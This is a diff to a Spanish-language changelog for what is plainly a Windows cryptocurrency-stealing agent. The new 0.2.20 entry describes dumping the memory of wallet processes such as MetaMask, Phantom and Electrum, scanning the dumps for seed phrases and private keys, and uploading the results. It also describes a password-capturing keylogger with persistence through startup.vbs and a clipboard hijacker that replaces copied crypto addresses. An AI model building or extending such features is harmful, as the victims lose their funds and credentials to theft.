@@ -1,5 +1,14 @@
 # Changelog
 
+## 0.2.20
+
+- Carteras: watcher residente de 1,5 s (título en primer plano + procesos) para Electrum, Phantom, MetaMask, Rabby, Trust, Coinbase Wallet, Ledger Live y Exodus. Phantom/MetaMask se vuelcan por los hijos `--extension-process` del navegador, no por el proceso principal. Aviso, espera de 5 s, dump, ZIP, subida y escaneo automáticos; reintentos 60/180 s, máximo tres dumps, dedupe por `(nombre, pid, arranque)`, cooldown global configurable y corte de 1,5 GB.
+- Escáner de memoria en Java puro, en streaming: BIP39 de 12/24 con checksum (lista incluida como recurso), `xprv/yprv/zprv` y claves Solana de 64 bytes. Máximo 20 hallazgos, artefacto `findings-<ts>.txt` y avisos separados para la seed.
+- Keylogger: hook nativo `WH_KEYBOARD_LL` con `ToUnicodeEx` y distribución activa, instancia única, arranque desde el agente y desde `startup.vbs` si `cache/ops/keys.on` existe. UI Automation `IsPassword` primero, heurística de ventana como fallback, buffer por ventana con flush en Enter/Tab/foco/10 s, límites 6–256 y `passwords.log` junto a `keys.log` con rotación y offsets persistentes. `keys off --hard` bloquea el relanzamiento por cartera.
+- Portapapeles: listener nativo `WM_CLIPBOARDUPDATE` con ventana solo-mensajes y protocolo duplex con el agente; sin polling. Validadores estrictos con checksum (BTC base58check/bech32/bech32m, EIP-55, SOL de 32 bytes, LTC, DOGE, BCH cashaddr, TRX, XRP, ADA), rotación round-robin, anti-bucle, máximo 128 caracteres, una línea, sin URLs y preservación de mayúsculas bech32. Comandos `clip on|off|status` y `addr add|list|del|clear`; overrides locales en `config.json`.
+- `discord.json` acepta `wallets`, `keylogger` y `clipboard.coins`; los tres servicios están on por defecto y ningún fallo tumba al agente. Estado nuevo (`walletsWatch`, `keylogger`, `clipboard`, cooldown, contadores, listas y rotación) y limpieza TTL que protege los artefactos operativos.
+- Limitación real: todo es Windows y necesita sesión interactiva; Linux solo conserva los comandos con aviso. Phantom no se descifra sin contraseña, para eso está el volcado.
+
 ## 0.2.19
 
 - Carteras: `memdump electrum|phantom` (MiniDumpWriteDump + zip), `keys on|off|dump` (solo ventanas de cartera), `clip`, `tools/dump-scan.py` para buscar BIP39/xprv en volcados y `tools/phantom-decrypt.py` (PBKDF2 + XChaCha) con contraseñas o logins guardados. `decrypt.py` prueba candidatas en Electrum y `ingest-case.sh` encadena Phantom.
